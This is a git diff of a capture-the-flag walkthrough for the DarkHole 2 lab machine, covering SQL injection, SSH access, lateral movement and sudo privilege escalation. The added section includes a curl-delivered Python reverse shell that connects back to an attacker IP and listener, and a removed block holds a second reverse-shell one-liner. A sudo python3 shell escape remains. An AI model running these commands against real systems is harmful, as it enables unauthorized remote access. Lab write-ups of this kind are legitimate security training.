@@ -122,7 +122,7 @@ Testing the application for SQL injection vulnerabilities using `sqlmap`:
 sqlmap -r sql --dbs --batch
 ```
 
-**Database Identified:** MySQL 5.0.12
+**Database Discovered:** `darkhole_2`
 
 ![SQL DBMS](assets/screenshots/sql-dbms.png)
 
@@ -148,37 +148,81 @@ ssh jehad@192.168.77.131
 
 ![SSH Access](assets/screenshots/exploit-done.png)
 
----
+### Initial Enumeration as jehad
 
-## Privilege Escalation
+Listed files in jehad's home directory:
 
-### Lateral Movement (jehad → losy)
+```bash
+ls -la
+```
 
-Examined bash history:
+**Files discovered:**
+- `.bash_history` (readable)
+- `.bashrc`
+- `.profile`
+- `.ssh/`
+
+![Jehad Details](assets/screenshots/jehad_details.png)
+
+Examined jehad's bash history:
 
 ```bash
 cat .bash_history
 ```
 
-**Found Password:** `gang` for user `losy`
+**Key Finding:** Discovered evidence of a local web service running on `localhost:9999` with command execution capability.
 
 ![Bash History](assets/screenshots/bash_history.png)
 
-Switched to user `losy`:
+Explored other home directories:
 
 ```bash
-su losy
+ls /home
 ```
+
+**Result:** Found three users: `jehad`, `lama`, `losy`
+
+### Local Web Service Exploitation
+
+Tested the local web service for command execution:
+
+```bash
+curl "http://127.0.0.1:9999/?cmd=id"
+```
+
+**Result:** The service responded with user information, confirming the service was running as user `losy` and had Remote Command Execution (RCE) capability.
+
+![Curl Test](assets/screenshots/curl_127.png)
+
+Set up a netcat listener on the attacking machine:
+
+```bash
+nc -nlvp 4444
+```
+
+Executed a Python reverse shell payload through the local web service:
+
+```bash
+curl 'http://127.0.0.1:9999/?cmd=python3%20-c%20"import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.77.130\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"'
+```
+
+**Result:** Successfully obtained a reverse shell as user `losy`.
+
+![NC Reverse Shell](assets/screenshots/nc-reverse-shell.png)
 
 Retrieved **user flag**:
 
 ```bash
-cat ~/user.txt
+cat user.txt
 ```
 
 **User Flag:** `DarkHole{'This_is_the_life_man_better_than_a_cruise'}`
 
 ![User CTF](assets/screenshots/user_ctf.png)
+
+---
+
+## Privilege Escalation
 
 ### Privilege Escalation (losy → root)
 
@@ -192,27 +236,11 @@ sudo -l
 
 ![Losy Password](assets/screenshots/losy-passwd.png)
 
-#### Exploitation Method 1: Direct Shell
+#### Exploitation
 
 ```bash
 sudo python3 -c 'import os; os.system("/bin/bash")'
 ```
-
-#### Exploitation Method 2: Reverse Shell
-
-Set up listener on attacking machine:
-
-```bash
-nc -nlvp 4444
-```
-
-Execute reverse shell:
-
-```bash
-sudo python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.77.130",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
-```
-
-![NC Reverse Shell](assets/screenshots/nc-reverse-shell.png)
 
 ### Root Access
 
@@ -258,11 +286,15 @@ cat /root/root.txt
    ↓
 7. SSH Access (user: jehad)
    ↓
-8. Lateral Movement (jehad → losy via bash_history)
+8. Enumeration as jehad (ls -la, cat .bash_history)
    ↓
-9. Privilege Escalation (sudo python3)
+9. Local Web Service Discovery (localhost:9999)
    ↓
-10. Root Access & Flag Capture
+10. RCE via Local Web Service (reverse shell as losy)
+   ↓
+11. Privilege Escalation (sudo python3)
+   ↓
+12. Root Access & Flag Capture
 ```
 
 ---
@@ -272,7 +304,7 @@ cat /root/root.txt
 1. **Exposed Git Repository** - Sensitive information disclosure
 2. **Hardcoded Credentials** - Credentials stored in version control
 3. **SQL Injection** - Unauthenticated database access
-4. **Sensitive Information in Bash History** - Password exposure
+4. **Local Web Service with RCE** - Unauthenticated command execution on localhost:9999 running as losy user
 5. **Sudo Misconfiguration** - Unrestricted python3 execution as root
 
 ---
@@ -282,8 +314,9 @@ cat /root/root.txt
 - Remove `.git` directory from production web servers
 - Never commit credentials to version control
 - Implement input validation and parameterized queries
+- Secure or disable local development services in production
+- Implement proper authentication and authorization for internal services
 - Use secrets management solutions
-- Configure bash to not store sensitive commands in history
 - Apply principle of least privilege for sudo permissions
 - Regular security audits and penetration testing
 
@@ -297,6 +330,7 @@ cat /root/root.txt
 - `git` - Version control analysis
 - `sqlmap` - SQL injection exploitation
 - `ssh` - Remote access
+- `curl` - Local web service exploitation
 - `netcat` - Reverse shell listener
 - `python3` - Privilege escalation
 
